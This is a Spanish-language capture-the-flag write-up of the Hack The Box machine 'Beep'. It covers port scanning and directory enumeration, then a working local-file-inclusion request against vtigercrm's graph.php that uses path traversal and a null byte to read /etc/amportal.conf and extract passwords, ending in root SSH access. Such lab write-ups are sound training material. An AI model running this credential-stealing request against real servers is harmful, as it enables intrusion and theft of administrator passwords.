---
layout: post
author: Sergio Salgado
---

|     Iformation         |      Link          |
|:-----------------------|:-------------------|
| Name                   | Beep               |
| Os                     | Linux              |
| Difficulty             | Easy               |
| Points                 | 20                 |
| IP                     | 10.10.10.7         |

Esta maquina la realizare al estilo del curso Hacking to the OSCP

## [](#header-2)Reconocimiento

Primero utilizaremos la herramienta que hace la identificación de conexión silenciosa y reconocimiento del sistema al que nos presentamos.

![Scan 1](/assets/images/Beep/scan1.png)

### [](#header-3)NMAP   

```s
sudo nmap -vvv -Pn -sCV --reason -T4 -p0-65535 oN beep.nmap 10.10.10.7
```

![nmap1](/assets/images/Beep/nmap1.png)

![nmap2](/assets/images/Beep/nmap2.png)

```s
whatweb http://10.10.10.7
```

![whatweb](/assets/images/Beep/whatweb.png)

```s
sudo dirsearch --url=https://10.10.10.7 --wordlist=/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt --threads 200 --random-agent
```

Con searchsploit encontramos una vulnerabilidad de LFI, en el cual podremos listar informacion del servidor mediante la url de la siguiente manera:

```s
curl -sk 'https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action' | grep -i pass | cut -d  = -f 2 | grep -v ^# | grep -v \( | uniq >> ../content/creds.txt
```

Ahora que tenemos las credenciales, podemos intentar conectarnos por ssh con

```s
ssh -oHostKeyAlgorithms=+ssh-dss root@10.10.10.7
```

Y en el archivo ~/.ssh/config agregar:

```s
Host 10.10.10.7
	KexAlgorithms +diffie-hellman-group1-sha1
```

Y directamente hemos accedido como root.

![root](/assets/images/Beep/root.png)

![powned](/assets/images/Beep/powned.png)